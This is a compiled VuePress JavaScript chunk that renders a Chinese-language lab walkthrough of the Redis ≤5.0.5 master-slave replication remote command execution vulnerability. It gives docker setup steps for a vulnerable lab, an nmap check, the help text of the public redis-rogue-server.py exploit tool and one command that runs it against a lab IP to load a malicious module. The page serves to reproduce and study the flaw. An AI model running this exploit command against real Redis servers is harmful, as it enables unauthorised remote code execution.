(window.webpackJsonp=window.webpackJsonp||[]).push([[344],{1766:function(s,a,t){s.exports=t.p+"assets/img/image-20220309231916165.e64b03c2.png"},1767:function(s,a,t){s.exports=t.p+"assets/img/image-20220309231926604.6bd821d6.png"},2742:function(s,a,t){"use strict";t.r(a);var n=t(75),e=Object(n.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"redis-小于5-0-5-主从复制远程命令执行漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#redis-小于5-0-5-主从复制远程命令执行漏洞"}},[s._v("#")]),s._v(" Redis 小于5.0.5 主从复制远程命令执行漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大")]),s._v(" "),n("p",[n("a",{attrs:{href:"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf",target:"_blank",rel:"noopener noreferrer"}},[s._v("Pavel Toporkov的分享"),n("OutboundLink")],1)]),s._v(" "),n("h2",{attrs:{id:"影响版本"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("Redis <= 5.0.5")]),n("br"),s._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[n("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" pull damonevking/redis5.0 \n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" run -p "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v(":6379 -d damonevking/redis5.0 redis-server\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("nmap扫描一下6379端口开放即为搭建成功")]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[s._v("root@kali:~/桌面"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# docker pull damonevking/redis5.0 ")]),s._v("\nUsing default tag: latest\n\nlatest: Pulling from damonevking/redis5.0\nfc7181108d40: Pull complete \n3e0ac67cad82: Pull complete \n6ee495cb7235: Pull complete \n9f7206d08b9d: Pull complete \na8354ef8cccb: Pull complete \n53afb10d81c2: Pull complete \nDigest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f\nStatus: Downloaded newer image "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" damonevking/redis5.0:latest\ndocker.io/damonevking/redis5.0:latest\nroot@kali:~/桌面"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server")]),s._v("\n1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12\nroot@kali:~/桌面"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# nmap 127.0.0.1 -p 6379")]),s._v("\nStarting Nmap "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("7.80")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" https://nmap.org "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" at "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2020")]),s._v("-12-08 "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v(":47 CST\nNmap scan report "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" localhost "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nHost is up "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(".000099s latency"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".\n\nPORT     STATE SERVICE\n"),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("/tcp "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  redis\n\nNmap done: "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" IP address "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v(" up"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" scanned "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.10")]),s._v(" seconds\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br")])]),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("关于漏洞原理请查看"),n("a",{attrs:{href:"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf",target:"_blank",rel:"noopener noreferrer"}},[s._v("Pavel Toporkov的分享"),n("OutboundLink")],1)]),s._v(" "),n("p",[s._v("漏洞利用脚本: "),n("a",{attrs:{href:"https://github.com/n0b0dyCN/redis-rogue-server",target:"_blank",rel:"noopener noreferrer"}},[s._v("n0b0dyCN/redis-rogue-server"),n("OutboundLink")],1)]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[s._v("➜ ./redis-rogue-server.py -h\n______         _ _      ______                         _____                          \n"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ___ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("       "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("     "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ___ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("                       /  ___"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                         \n"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_/ /___  __"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_ ___  "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_/ /___   __ _ _   _  ___  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("--.  ___ _ ____   _____ _ __ \n"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    // _ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("/ _"),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" / __"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    // _ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" / _"),n("span",{pre:!0,attrs:{class:"token variable"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("/ _ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("  "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("--. "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("/ _ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'__\\ \\ / / _ \\ '")]),s._v("__"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("  __/ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("  __/ /"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__/ /  __/ "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(" V /  __/ "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   \n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__,_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("___/ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___/ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__, "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__,_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("____/ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_/ "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   \n                                     __/ "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                                            \n                                    "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("___/                                             \n@copyright n0b0dy @ r3kapig\n\nUsage: redis-rogue-server.py "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("options"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nOptions:\n  -h, --help           show this "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("help")]),s._v(" message and "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n  --rhost"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("REMOTE_HOST  target "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v("\n  --rport"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("REMOTE_PORT  target redis port, default "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\n  --lhost"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("LOCAL_HOST   rogue server "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("ip")]),s._v("\n  --lport"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("LOCAL_PORT   rogue server listen port, default "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("21000")]),s._v("\n  --exp"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("EXP_FILE       Redis Module to load, default exp.so\n  -v, --verbose        Show full data stream\nExample\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br")])]),n("p",[n("img",{attrs:{src:t(1766),alt:"image-20220309231916165"}})]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[s._v("python3 redis-rogue-server.py --rhost "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146 --lhost "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146 --exp"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("exp.so\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:t(1767),alt:"image-20220309231926604"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);